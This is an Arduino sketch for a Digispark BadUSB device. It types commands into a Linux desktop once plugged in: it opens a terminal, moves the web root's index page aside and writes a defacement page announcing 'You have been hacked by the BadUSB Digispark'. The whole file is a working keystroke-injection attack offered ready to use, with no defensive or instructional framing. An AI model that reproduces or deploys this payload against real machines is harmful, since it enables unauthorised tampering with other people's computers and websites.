#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_F2,MOD_ALT_LEFT);
  delay(1000);
  DigiKeyboard.println("gnome-terminal");
  delay(3000);
  DigiKeyboard.println("cd /var/www");
  delay(2000);
  DigiKeyboard.println("mv index.* index.bak");
  delay(2000);
  DigiKeyboard.println("touch index.html");
  delay(2000);
  DigiKeyboard.println("nano index.html");
  delay(2000);
  DigiKeyboard.println("<marquee><h1>You have been hacked by the BadUSB Digispark</h1></marquee>");
  delay(2000);
  DigiKeyboard.println("<center><a href=\"http://www.usbrubberducky.com/\"><img src=\"http://cdn.shopify.com/s/files/1/0068/2142/products/usbducky2.jpg\" /></a><center>");
  delay(2000);
  DigiKeyboard.println("<center><h5>Your old index page can be found <a href=\"./index.bak\">here.</a></h5></center>");
  delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_X,MOD_CONTROL_LEFT);
  delay(2000);
  DigiKeyboard.println("y");
  delay(2000);
  DigiKeyboard.println("exit");
  while(1);
}
